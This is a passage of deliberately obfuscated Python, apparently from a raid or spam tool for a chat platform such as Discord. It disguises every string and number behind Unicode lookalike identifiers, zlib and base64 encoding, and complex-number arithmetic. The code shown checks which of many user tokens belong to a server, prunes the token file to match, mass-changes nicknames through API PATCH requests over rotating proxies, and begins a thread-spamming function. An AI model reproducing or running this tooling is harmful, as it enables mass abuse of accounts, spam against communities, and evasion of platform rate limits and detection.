0j))]).b64decode(__𝗶𝙢𝘱𝙤𝘳𝘵__(𝗹𝙈𝗜𝘐𝘔𝗹𝘔𝙉𝗜𝙄𝙉𝘔𝗹𝘭𝙄𝙈𝘭𝙈𝘭𝗜𝗠𝗜𝗠𝘐𝙉𝘔𝘐𝗹𝙡𝙡𝗡𝘭[𝘳𝙤𝘂𝙣𝘥(𝗮𝗯𝘀(0.09733416325480004 + 0.9952517574279826j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝘪𝗺𝗽𝘰𝗿𝘁__(𝙡𝗠𝗜𝗜𝙈𝘭𝗠𝘕𝙄𝗜𝗡𝙈𝗹𝘭𝙄𝗠𝙡𝘔𝗹𝙄𝘔𝙄𝙈𝘐𝙉𝗠𝙄𝙡𝗹𝙡𝘕𝗹[𝙧𝘰𝘂𝙣𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝙤𝘳𝘵__(𝘭𝗠𝗜𝗜𝗠𝘭𝘔𝘕𝗜𝙄𝗡𝗠𝘭𝙡𝙄𝙈𝗹𝙈𝗹𝘐𝙈𝗜𝗠𝘐𝙉𝙈𝘐𝗹𝙡𝙡𝙉𝗹[𝗿𝘰𝘶𝗻𝙙(𝙖𝗯𝘀(0.41039787859302335 + 0.9119065638794065j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝘢𝘯𝘥𝘰𝘮.choice(𝙥𝗿𝘰𝘅𝗶𝙚𝘴)})
        else:
            𝙧𝙚𝙨𝙥𝘰𝗻𝙨𝙚 = 𝘳𝙚𝘲𝘂𝙚𝘴𝙩𝘴.get(__𝙞𝘮𝙥𝙤𝙧𝘵__(𝗹𝘔𝙄𝙄𝗠𝙡𝘔𝙉𝙄𝙄𝗡𝙈𝙡𝗹𝙄𝙈𝗹𝘔𝘭𝙄𝗠𝘐𝙈𝙄𝗡𝗠𝗜𝗹𝙡𝙡𝗡𝘭[𝗿𝙤𝘂𝙣𝙙(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__(𝗹𝗠𝗜𝙄𝙈𝗹𝙈𝗡𝘐𝙄𝙉𝗠𝘭𝗹𝘐𝘔𝙡𝗠𝗹𝗜𝘔𝗜𝗠𝙄𝘕𝗠𝘐𝘭𝘭𝙡𝗡𝗹[𝙧𝘰𝙪𝗻𝗱(𝙖𝘣𝘀(0.008052372217989046 + 0.9999675791252749j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\x04\x00\x8cJ\x10\x7f')).decode().format(𝙜𝘂𝙞𝙡𝙙𝘪𝗱), headers=𝘩𝗲𝙖𝙙𝘦𝘳𝘀)
        𝘥𝗻 = 𝘁𝗼𝘬𝗲𝗻.split(__𝗶𝘮𝗽𝘰𝗿𝙩__(𝙡𝘔𝗜𝙄𝙈𝘭𝙈𝘕𝙄𝗜𝘕𝘔𝙡𝗹𝗜𝘔𝘭𝗠𝗹𝗜𝘔𝙄𝗠𝙄𝗡𝗠𝙄𝘭𝘭𝙡𝘕𝙡[𝘳𝘰𝘂𝙣𝙙(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝘳𝙩__(𝘭𝗠𝗜𝘐𝙈𝘭𝙈𝙉𝗜𝙄𝗡𝙈𝗹𝙡𝗜𝗠𝙡𝘔𝗹𝘐𝗠𝙄𝘔𝘐𝘕𝙈𝘐𝘭𝘭𝘭𝗡𝙡[𝗿𝘰𝙪𝘯𝘥(𝗮𝘣𝘀(0.11850189376648668 + 0.9929538263050082j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
        𝙣𝙣 = 𝗱𝙣[𝙧𝙤𝙪𝘯𝙙(𝗮𝗯𝘀(0.0 + 0j))]
        if 𝘳𝙚𝘴𝙥𝘰𝗻𝙨𝘦.status_code == 𝗿𝙤𝘶𝘯𝗱(𝘢𝙗𝙨(199.12147196210663 + 18.725367917453283j)):
            𝗽𝘳𝗶𝙣𝘁(__𝗶𝗺𝙥𝗼𝘳𝙩__(𝘭𝗠𝙄𝗜𝘔𝙡𝗠𝘕𝗜𝘐𝙉𝗠𝙡𝗹𝗜𝗠𝗹𝗠𝗹𝘐𝘔𝗜𝙈𝗜𝘕𝘔𝘐𝙡𝘭𝘭𝗡𝙡[𝗿𝘰𝙪𝗻𝘥(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝗿𝘵__(𝙡𝗠𝗜𝗜𝙈𝗹𝙈𝘕𝗜𝙄𝗡𝗠𝘭𝙡𝙄𝗠𝗹𝘔𝘭𝘐𝗠𝘐𝘔𝘐𝘕𝙈𝙄𝘭𝙡𝙡𝙉𝙡[𝗿𝗼𝘂𝙣𝙙(𝘢𝗯𝘴(0.6253611256198409 + 0.7803354807795719j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\x0e\xcb\x8a4\n\xabJ\x06\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xfc\xdb\x0c\xa3')).decode().format(𝙧, 𝙙𝙖𝙩𝘦𝘵𝗶𝗺𝙚.datetime.now().strftime(f"{𝙜}{__𝘪𝙢𝙥𝘰𝘳𝙩__(𝗹𝙈𝙄𝙄𝙈𝗹𝙈𝘕𝗜𝗜𝘕𝘔𝗹𝘭𝘐𝙈𝘭𝗠𝙡𝗜𝘔𝘐𝗠𝙄𝘕𝘔𝙄𝘭𝗹𝗹𝙉𝗹[𝗿𝘰𝙪𝙣𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝗿}"), 𝘳, 𝙡𝗰, 𝘳, 𝙣𝗻, 𝙜))
            return True
        else:
            𝙥𝙧𝘪𝗻𝘁(__𝗶𝘮𝙥𝙤𝗿𝙩__(𝗹𝗠𝘐𝘐𝙈𝘭𝙈𝙉𝘐𝘐𝙉𝗠𝗹𝘭𝘐𝘔𝙡𝘔𝗹𝘐𝗠𝙄𝘔𝗜𝙉𝗠𝙄𝙡𝗹𝙡𝘕𝙡[𝘳𝙤𝘶𝗻𝘥(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝘳𝙩__(𝙡𝗠𝗜𝙄𝙈𝘭𝘔𝙉𝘐𝘐𝙉𝘔𝗹𝗹𝗜𝙈𝘭𝗠𝗹𝘐𝙈𝗜𝗠𝙄𝘕𝙈𝗜𝗹𝙡𝘭𝘕𝗹[𝘳𝘰𝙪𝘯𝙙(𝗮𝗯𝙨(0.6793740822153189 + 0.7337921070808088j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\xf2\x08\xab\x8c\x8a(\xb1\x8c\x08v2O\x03\xd2\xde\x99\xf9\xb6\x00\x04\xd6\r\n')).decode().format(𝙧, 𝗱𝙖𝘁𝘦𝙩𝘪𝗺𝗲.datetime.now().strftime(f"{𝙜}{__𝗶𝗺𝙥𝘰𝙧𝙩__(𝙡𝗠𝗜𝘐𝗠𝙡𝘔𝘕𝗜𝘐𝘕𝙈𝗹𝗹𝘐𝘔𝘭𝙈𝘭𝗜𝗠𝙄𝗠𝗜𝙉𝘔𝙄𝗹𝘭𝘭𝗡𝙡[𝙧𝘰𝘂𝙣𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝙧}"), 𝘳, 𝗯, 𝗿, 𝗻𝙣, 𝘨))
            return False
    except:
        pass

def save_tokens_guild(file_path, guildid):
    𝙫𝘢𝙡𝗶𝘥_𝘵𝘰𝘬𝙚𝙣𝘴 = 𝗿𝘰𝘂𝙣𝙙(𝙖𝘣𝘴(0.0 + 0j))
    𝘵𝘰𝗸𝘦𝘯𝙨_𝘷𝙖𝙡𝙞𝗱 = []
    𝘵𝘰𝗸𝘦𝗻𝘀 = 𝘰𝙥𝙚𝙣(𝗳𝘪𝗹𝘦_𝙥𝗮𝘵𝘩, __𝗶𝙢𝗽𝙤𝙧𝙩__(𝘭𝘔𝘐𝙄𝗠𝗹𝗠𝗡𝘐𝘐𝗡𝘔𝘭𝗹𝘐𝘔𝘭𝗠𝙡𝗜𝗠𝗜𝗠𝗜𝗡𝗠𝙄𝗹𝙡𝘭𝗡𝙡[𝙧𝘰𝘶𝙣𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝙤𝗿𝘵__(𝘭𝙈𝗜𝙄𝘔𝙡𝗠𝗡𝙄𝗜𝘕𝘔𝗹𝙡𝙄𝙈𝙡𝗠𝙡𝘐𝘔𝘐𝗠𝙄𝙉𝙈𝘐𝗹𝗹𝘭𝘕𝗹[𝘳𝗼𝙪𝘯𝙙(𝗮𝗯𝘀(0.6285204567298356 + 0.7777930543995097j))]).decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode()).read().splitlines()
    for 𝙩𝙤𝗸𝘦𝘯 in 𝙩𝗼𝘬𝙚𝘯𝙨:
        if 𝗰𝙝𝗲𝙘𝗸_𝘨𝘂𝗶𝙡𝘥(𝘁𝗼𝗸𝗲𝗻, 𝘨𝙪𝙞𝗹𝗱𝗶𝗱):
            𝘷𝙖𝗹𝙞𝗱_𝘵𝗼𝙠𝗲𝗻𝙨 += 𝗿𝘰𝘂𝗻𝙙(𝗮𝘣𝘀(0.8287827995277051 + 0.5595704345361895j))
            𝘁𝘰𝘬𝗲𝗻𝘀_𝘷𝙖𝗹𝙞𝗱.append(𝘵𝘰𝗸𝗲𝘯)
    with 𝙤𝗽𝗲𝙣(𝗳𝘪𝘭𝘦_𝗽𝘢𝙩𝗵, __𝙞𝙢𝗽𝙤𝙧𝘁__(𝘭𝗠𝗜𝗜𝙈𝙡𝗠𝗡𝗜𝘐𝗡𝙈𝗹𝘭𝘐𝙈𝘭𝙈𝙡𝘐𝙈𝙄𝗠𝙄𝗡𝙈𝗜𝙡𝗹𝗹𝗡𝙡[𝘳𝘰𝘶𝙣𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝘰𝙧𝘁__(𝙡𝗠𝘐𝘐𝙈𝘭𝙈𝗡𝙄𝗜𝘕𝙈𝗹𝘭𝙄𝗠𝗹𝘔𝙡𝗜𝘔𝗜𝗠𝗜𝗡𝗠𝘐𝙡𝗹𝘭𝗡𝗹[𝗿𝙤𝙪𝙣𝗱(𝗮𝙗𝘀(0.6633982031108886 + 0.7482665461646967j))]).decompress(b'x\xdaK\xa9,\xb6\x05\x00\x04"\x01\x8e')).decode()) as 𝘧:
        𝙛.truncate(𝗿𝘰𝙪𝘯𝗱(𝗮𝙗𝙨(0.0 + 0j)))
    with 𝙤𝘱𝗲𝗻(𝗳𝗶𝙡𝘦_𝘱𝙖𝘁𝙝, __𝗶𝙢𝗽𝘰𝘳𝘁__(𝘭𝘔𝘐𝙄𝙈𝗹𝘔𝘕𝙄𝗜𝘕𝙈𝙡𝙡𝗜𝘔𝙡𝙈𝘭𝘐𝗠𝘐𝗠𝗜𝘕𝗠𝘐𝗹𝗹𝙡𝙉𝗹[𝘳𝙤𝘂𝘯𝙙(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝙤𝗿𝙩__(𝗹𝗠𝙄𝗜𝙈𝘭𝘔𝘕𝗜𝙄𝙉𝗠𝙡𝘭𝘐𝘔𝘭𝙈𝙡𝙄𝙈𝘐𝘔𝘐𝗡𝗠𝗜𝙡𝗹𝘭𝗡𝙡[𝘳𝙤𝙪𝘯𝙙(𝙖𝘣𝘀(0.8834341111257853 + 0.46855540899598375j))]).decompress(b'x\xda\x8b\x0c.\xb6\x05\x00\x03\x84\x01]')).decode()) as 𝗳:
        for 𝙩𝘰𝗸𝙚𝗻 in 𝘁𝘰𝗸𝙚𝘯𝙨_𝘷𝗮𝘭𝗶𝙙:
            𝘧.write(𝘵𝗼𝘬𝙚𝘯 + __𝗶𝙢𝘱𝘰𝙧𝘁__(𝗹𝙈𝘐𝘐𝘔𝙡𝙈𝙉𝗜𝘐𝗡𝗠𝘭𝗹𝘐𝗠𝙡𝙈𝘭𝙄𝘔𝗜𝘔𝘐𝙉𝗠𝗜𝘭𝗹𝙡𝙉𝙡[𝙧𝗼𝘂𝗻𝙙(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝘰𝘳𝘁__(𝙡𝙈𝘐𝘐𝗠𝘭𝘔𝙉𝙄𝙄𝙉𝘔𝙡𝗹𝗜𝘔𝘭𝙈𝙡𝗜𝗠𝘐𝘔𝙄𝘕𝙈𝗜𝗹𝘭𝘭𝙉𝗹[𝗿𝘰𝘂𝘯𝘥(𝗮𝘣𝘀(0.5926392073069279 + 0.8054680440356502j))]).decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())

def mass_nick(token, guild, nick):
    𝘩𝗲𝙖𝗱𝘦𝘳𝘀 = 𝘏𝘦𝗮𝙙𝗲𝘳𝙨(𝘁𝘰𝙠𝗲𝘯)
    𝙥𝘢𝘆𝙡𝘰𝙖𝙙 = {__𝘪𝗺𝙥𝙤𝗿𝘵__(𝙡𝘔𝙄𝗜𝙈𝗹𝘔𝘕𝙄𝘐𝙉𝘔𝙡𝘭𝗜𝙈𝙡𝗠𝘭𝘐𝘔𝙄𝙈𝗜𝗡𝙈𝙄𝙡𝙡𝗹𝘕𝘭[𝙧𝘰𝙪𝙣𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝙧𝘵__(𝘭𝗠𝙄𝘐𝗠𝘭𝙈𝗡𝙄𝘐𝙉𝙈𝙡𝘭𝙄𝘔𝘭𝗠𝙡𝙄𝗠𝘐𝗠𝘐𝘕𝙈𝗜𝘭𝗹𝘭𝗡𝙡[𝙧𝗼𝙪𝗻𝘥(𝙖𝘣𝘴(0.18498405903628645 + 0.9827415214096022j))]).decompress(b'x\xdaK\xca\xcd\xc9J,\xb7\xb5\x05\x00\x0eM\x02\xf8')).decode(): 𝗻𝙞𝙘𝘬}
    𝗱𝘯 = 𝘁𝙤𝙠𝘦𝗻.split(__𝘪𝘮𝗽𝗼𝙧𝘵__(𝘭𝘔𝗜𝗜𝘔𝗹𝙈𝘕𝘐𝘐𝗡𝙈𝗹𝙡𝙄𝗠𝘭𝙈𝗹𝙄𝘔𝙄𝗠𝗜𝙉𝗠𝙄𝙡𝗹𝗹𝗡𝙡[𝘳𝗼𝘶𝗻𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝗿𝘁__(𝘭𝗠𝙄𝙄𝘔𝗹𝙈𝗡𝗜𝘐𝘕𝘔𝙡𝘭𝗜𝙈𝙡𝘔𝗹𝗜𝙈𝗜𝗠𝙄𝗡𝗠𝙄𝙡𝘭𝘭𝙉𝘭[𝘳𝘰𝘂𝘯𝗱(𝙖𝙗𝙨(0.8129894419229143 + 0.5822784276631483j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
    𝘯𝙣 = 𝗱𝘯[𝗿𝗼𝘶𝘯𝘥(𝘢𝘣𝘀(0.0 + 0j))]
    if 𝗽𝘳𝗼𝘅𝘆:
        𝗿𝗿 = 𝘳𝘦𝘲𝙪𝗲𝙨𝙩𝙨.patch(__𝗶𝘮𝙥𝘰𝗿𝘵__(𝙡𝗠𝙄𝙄𝗠𝘭𝘔𝘕𝗜𝗜𝘕𝗠𝙡𝗹𝘐𝘔𝙡𝙈𝗹𝙄𝙈𝙄𝗠𝙄𝘕𝘔𝗜𝗹𝗹𝘭𝙉𝘭[𝙧𝙤𝘂𝗻𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝘳𝘵__(𝙡𝗠𝘐𝘐𝗠𝙡𝙈𝙉𝘐𝙄𝗡𝙈𝙡𝙡𝘐𝗠𝙡𝘔𝘭𝙄𝘔𝘐𝘔𝘐𝘕𝘔𝘐𝙡𝘭𝘭𝘕𝘭[𝙧𝘰𝘂𝙣𝗱(𝗮𝙗𝘴(0.6635495766629876 + 0.7481323140396823j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\xf412\xccI\n\xf7\xcaI\xce\xf3-\x0bt7\xcc\x01\x00\xc0C\x15\xd2')).decode().format(𝙜𝘂𝘪𝘭𝘥), json=𝘱𝗮𝘆𝙡𝗼𝙖𝙙, headers=𝙝𝗲𝘢𝘥𝗲𝗿𝙨, proxy={__𝘪𝘮𝙥𝙤𝙧𝘵__(𝘭𝗠𝙄𝘐𝘔𝙡𝙈𝗡𝙄𝗜𝗡𝗠𝗹𝗹𝙄𝗠𝗹𝙈𝘭𝘐𝗠𝗜𝘔𝘐𝙉𝘔𝗜𝘭𝙡𝘭𝘕𝗹[𝙧𝗼𝘂𝙣𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝙧𝘵__(𝘭𝙈𝘐𝙄𝙈𝘭𝙈𝙉𝙄𝙄𝙉𝘔𝘭𝗹𝘐𝙈𝗹𝙈𝗹𝗜𝗠𝘐𝘔𝗜𝗡𝙈𝙄𝙡𝘭𝙡𝘕𝙡[𝙧𝙤𝙪𝘯𝘥(𝙖𝗯𝘴(0.9922569946227677 + 0.12420167721167316j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝙞𝘮𝗽𝘰𝘳𝙩__(𝗹𝙈𝙄𝗜𝙈𝘭𝙈𝗡𝘐𝙄𝘕𝗠𝙡𝘭𝗜𝘔𝙡𝘔𝙡𝘐𝘔𝘐𝙈𝘐𝘕𝙈𝘐𝘭𝙡𝘭𝙉𝘭[𝗿𝗼𝘂𝙣𝙙(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝘳𝘁__(𝗹𝙈𝙄𝗜𝗠𝗹𝗠𝗡𝘐𝙄𝗡𝗠𝙡𝙡𝗜𝘔𝙡𝘔𝙡𝗜𝗠𝘐𝘔𝗜𝙉𝙈𝙄𝘭𝙡𝗹𝘕𝘭[𝗿𝙤𝘶𝗻𝘥(𝘢𝘣𝘀(0.5610577521434437 + 0.8277766599510681j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝙖𝘯𝗱𝘰𝙢.choice(𝘱𝙧𝙤𝙭𝙞𝗲𝙨), __𝗶𝙢𝙥𝘰𝘳𝘁__(𝗹𝗠𝘐𝙄𝙈𝙡𝙈𝙉𝙄𝗜𝘕𝗠𝙡𝘭𝘐𝘔𝘭𝗠𝘭𝗜𝗠𝙄𝗠𝘐𝙉𝗠𝙄𝘭𝘭𝗹𝘕𝗹[𝙧𝙤𝘂𝙣𝗱(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝗿𝙩__(𝗹𝗠𝘐𝙄𝙈𝘭𝘔𝗡𝙄𝙄𝗡𝘔𝗹𝙡𝘐𝙈𝗹𝙈𝗹𝗜𝙈𝙄𝙈𝙄𝙉𝘔𝙄𝗹𝙡𝘭𝘕𝗹[𝙧𝙤𝘶𝗻𝗱(𝘢𝙗𝘀(0.6860333700613698 + 0.7275700757743131j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝘪𝘮𝙥𝘰𝙧𝘵__(𝘭𝙈𝗜𝗜𝙈𝗹𝗠𝗡𝘐𝘐𝘕𝘔𝙡𝘭𝘐𝗠𝙡𝗠𝗹𝘐𝗠𝗜𝘔𝗜𝗡𝗠𝘐𝙡𝘭𝗹𝗡𝘭[𝗿𝘰𝘶𝙣𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝘳𝘵__(𝘭𝘔𝗜𝗜𝙈𝙡𝘔𝙉𝙄𝙄𝘕𝘔𝗹𝙡𝗜𝘔𝘭𝗠𝘭𝙄𝗠𝘐𝗠𝘐𝘕𝗠𝗜𝘭𝗹𝗹𝘕𝘭[𝘳𝘰𝘶𝙣𝗱(𝗮𝘣𝘴(0.9093173777006448 + 0.4161032403281941j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝗮𝘯𝙙𝗼𝗺.choice(𝘱𝙧𝗼𝙭𝘪𝘦𝙨)})
    else:
        𝗿𝗿 = 𝙧𝘦𝗾𝘶𝗲𝘴𝘁𝘀.patch(__𝘪𝘮𝘱𝗼𝗿𝘵__(𝗹𝘔𝗜𝘐𝘔𝘭𝘔𝙉𝙄𝙄𝘕𝘔𝘭𝘭𝗜𝙈𝗹𝘔𝘭𝘐𝗠𝗜𝙈𝘐𝘕𝘔𝘐𝗹𝗹𝙡𝘕𝗹[𝘳𝗼𝘶𝙣𝘥(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝘳𝘵__(𝘭𝗠𝙄𝘐𝙈𝗹𝙈𝘕𝗜𝘐𝗡𝙈𝙡𝗹𝗜𝘔𝘭𝗠𝗹𝘐𝘔𝘐𝗠𝗜𝙉𝘔𝙄𝘭𝗹𝘭𝘕𝙡[𝘳𝙤𝘶𝗻𝗱(𝗮𝘣𝙨(0.2695740998533659 + 0.9629796491558104j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\xf412\xccI\n\xf7\xcaI\xce\xf3-\x0bt7\xcc\x01\x00\xc0C\x15\xd2')).decode().format(𝘨𝘂𝗶𝗹𝙙), json=𝙥𝗮𝘺𝘭𝘰𝙖𝘥, headers=𝙝𝘦𝙖𝗱𝙚𝗿𝘴)
    if 𝙧𝗿.status_code == 𝙧𝙤𝙪𝗻𝗱(𝘢𝗯𝙨(112.50271043857782 + 165.3576128999615j)):
        𝙥𝘳𝗶𝘯𝙩(__𝗶𝙢𝘱𝗼𝗿𝘁__(𝘭𝘔𝗜𝘐𝙈𝙡𝘔𝙉𝘐𝙄𝘕𝗠𝙡𝗹𝘐𝘔𝙡𝙈𝙡𝙄𝙈𝗜𝘔𝗜𝗡𝗠𝗜𝘭𝘭𝗹𝙉𝘭[𝗿𝗼𝙪𝙣𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝙤𝗿𝙩__(𝗹𝘔𝗜𝘐𝙈𝘭𝗠𝙉𝘐𝘐𝘕𝘔𝗹𝙡𝙄𝘔𝙡𝘔𝙡𝗜𝘔𝘐𝗠𝘐𝘕𝘔𝘐𝘭𝗹𝙡𝘕𝗹[𝗿𝗼𝘶𝗻𝘥(𝘢𝙗𝘴(0.8410211666845367 + 0.5410022155117118j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\x0e\xcb\x8a4\n\xabJ\x06\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xfc\xdb\x0c\xa3')).decode().format(𝘳, 𝙙𝘢𝘁𝙚𝘁𝗶𝙢𝙚.datetime.now().strftime(f"{𝙜}{__𝗶𝙢𝗽𝗼𝗿𝙩__(𝘭𝗠𝙄𝘐𝗠𝘭𝗠𝘕𝘐𝘐𝗡𝗠𝗹𝙡𝘐𝗠𝗹𝗠𝘭𝗜𝘔𝙄𝙈𝙄𝘕𝘔𝙄𝘭𝘭𝗹𝗡𝗹[𝘳𝘰𝘶𝙣𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝗿, 𝗹𝘤, 𝘳, 𝙣𝙣, 𝘨))
    else:
        𝘱𝙧𝙞𝘯𝘵(__𝙞𝗺𝘱𝙤𝗿𝘵__(𝗹𝙈𝙄𝗜𝗠𝗹𝙈𝙉𝘐𝙄𝗡𝗠𝗹𝙡𝙄𝗠𝗹𝘔𝗹𝙄𝙈𝘐𝙈𝘐𝗡𝙈𝗜𝘭𝘭𝗹𝙉𝘭[𝗿𝗼𝘶𝘯𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__(𝘭𝙈𝘐𝗜𝗠𝙡𝗠𝙉𝘐𝗜𝗡𝙈𝘭𝙡𝗜𝗠𝙡𝗠𝗹𝗜𝗠𝘐𝗠𝗜𝗡𝗠𝙄𝗹𝙡𝗹𝗡𝗹[𝗿𝘰𝘶𝘯𝙙(𝗮𝘣𝙨(0.4300465466303792 + 0.9028067167070065j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\rl\x01\x02\x05\x0c\xb8')).decode().format(𝙧, 𝗱𝙖𝘁𝗲𝘵𝙞𝘮𝘦.datetime.now().strftime(f"{𝙜}{__𝘪𝗺𝙥𝙤𝙧𝘵__(𝘭𝘔𝘐𝙄𝘔𝘭𝘔𝘕𝙄𝘐𝙉𝙈𝘭𝙡𝙄𝘔𝙡𝘔𝙡𝘐𝘔𝗜𝙈𝘐𝘕𝙈𝙄𝘭𝘭𝘭𝗡𝗹[𝗿𝘰𝘂𝗻𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝗿, 𝙗, 𝘳, 𝗻𝗻, 𝙜, 𝗿𝙧.text))

def thread_spammer(token, name, channel):
    𝙝𝘦𝘢𝙙𝘦𝙧𝙨 = 𝗛𝗲𝙖𝗱𝘦𝙧𝘀(𝘵𝙤𝗸𝗲𝗻)
    𝗽𝘢𝘆𝙡𝗼𝙖𝘥 = {__𝗶𝘮𝗽𝗼𝘳𝘁__(𝙡𝙈𝙄𝘐𝗠𝗹𝙈𝙉𝗜𝗜𝘕𝗠𝗹𝗹𝙄𝘔𝙡𝘔𝗹𝘐𝗠𝙄𝙈𝗜𝘕𝘔𝗜𝘭𝗹𝗹𝙉𝙡[𝗿𝗼𝘶𝘯𝗱(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝙧𝙩__(𝙡𝗠𝗜𝗜𝗠𝘭𝘔𝙉𝘐𝘐𝘕𝗠𝘭𝗹𝙄𝙈𝙡𝗠𝗹𝘐𝘔𝘐𝗠𝗜𝙉𝘔𝙄𝗹𝗹𝗹𝘕𝗹[𝗿𝘰𝘂𝘯𝗱(𝙖𝘣𝙨(0.5716032392392852 + 0.8205301559913301j))]).decompress(b'x\xdaK\xcau+\x89\n\xb4\xb5\x05\x00\r\r\x02\xaf')).decode(): 𝘯𝗮𝗺𝘦, __𝗶𝘮𝘱𝙤𝘳𝘁__(𝙡𝗠𝙄𝗜𝘔𝗹𝙈𝙉𝘐𝘐𝗡𝗠𝙡𝘭𝗜𝙈𝙡𝙈𝘭𝙄𝗠𝗜𝙈𝙄𝙉𝗠𝗜𝙡𝗹𝗹𝘕𝗹[𝗿𝘰𝘂𝗻𝘥(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝘳𝙩__(𝙡𝘔𝙄𝗜𝙈𝙡𝘔𝙉𝗜𝗜𝘕𝙈𝘭𝙡𝘐𝘔𝘭𝘔𝘭𝘐𝗠𝘐𝙈𝙄𝗡𝗠𝙄𝙡𝗹𝙡𝘕𝙡[𝗿𝘰𝘂𝙣𝗱(𝘢𝗯𝙨(0.269111771207468 + 0.963108952610025j))]).decompress(b'x\xdaK\xf1\xc8)\x8f\n\xb4\xb5\x05\x00\r\r\x02\xb5')).decode(): 𝘳𝗼𝘶𝗻𝙙(𝘢𝘣𝘀(7.258487227727766 + 8.265250338913692j)), __𝘪𝘮𝗽𝙤𝘳𝘁__(𝘭𝘔𝗜𝘐𝘔𝗹𝙈𝘕𝘐𝘐𝗡𝗠𝗹𝘭𝘐𝘔𝗹𝙈𝗹𝙄𝗠𝙄𝘔𝗜𝙉𝘔𝘐𝙡𝘭𝙡𝗡𝙡[𝘳𝗼𝘶𝘯𝘥(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝘳𝙩__(𝗹𝗠𝙄𝘐𝙈𝗹𝙈𝘕𝗜𝗜𝙉𝗠𝗹𝘭𝙄𝗠𝘭𝗠𝙡𝙄𝙈𝘐𝙈𝗜𝘕𝙈𝗜𝙡𝗹𝗹𝘕𝗹[𝘳𝘰𝙪𝗻𝘥(𝙖𝘣𝙨(0.9590543843574759 + 